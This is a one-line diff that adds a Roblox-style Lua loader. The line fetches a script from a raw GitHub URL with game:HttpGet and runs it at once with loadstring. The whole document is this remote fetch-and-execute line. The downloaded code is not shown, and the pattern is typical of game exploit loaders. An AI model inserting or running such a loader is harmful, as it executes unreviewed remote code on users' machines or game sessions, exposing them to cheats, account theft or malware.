@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/andhikadaki/Amboi/main/120398694613042.lua"))()
